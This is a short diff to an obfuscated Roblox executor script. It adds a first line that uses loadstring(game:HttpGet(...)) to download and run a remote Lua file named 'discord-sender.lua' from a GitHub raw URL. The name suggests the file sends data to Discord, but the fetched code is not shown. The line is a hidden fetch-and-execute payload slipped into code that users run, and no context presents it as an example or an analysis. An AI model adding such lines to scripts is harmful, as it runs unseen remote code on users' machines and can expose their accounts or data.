@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ideaphoton/rbxscripts/main/initialises/pure/discord-sender.lua"))()
 for i =1, getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH do
 ([[
                      		   This script was obfuscated using ActualShitFuscator.
